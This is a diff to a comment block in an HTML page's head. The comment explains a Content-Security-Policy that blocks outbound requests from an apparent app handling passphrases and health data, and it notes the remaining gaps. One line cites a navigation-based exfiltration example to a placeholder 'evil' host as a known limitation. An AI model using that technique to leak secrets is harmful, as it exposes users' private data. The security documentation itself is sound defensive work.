@@ -7,13 +7,13 @@
     default-src/connect-src/img-src 'self' block outbound network REQUESTS (fetch,
     XHR, sendBeacon, image beacons): even if a script is injected (malicious
     extension, DOM clobbering, prototype pollution), it cannot phone a stolen
-    passphrase or PHI home that way, and remote <script> sources are refused.
+    passphrase or PHI home that way, and remote script sources are refused.
     CAVEAT: 'unsafe-inline' is still required (the UI uses inline onclick handlers
     + styles throughout), so an injected inline script can still RUN — and CSP
     cannot block top-level NAVIGATION exfil (window.location = 'evil?k=…'); closing
     both needs dropping 'unsafe-inline' via a nonce refactor of the inline handlers.
     'wasm-unsafe-eval' is required to compile the bundled sql.js WebAssembly.
-    frame-ancestors / HSTS can't be set via <meta> — use HTTP headers at your host.
+    frame-ancestors / HSTS can't be set via a meta tag — use HTTP headers at your host.
   -->
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
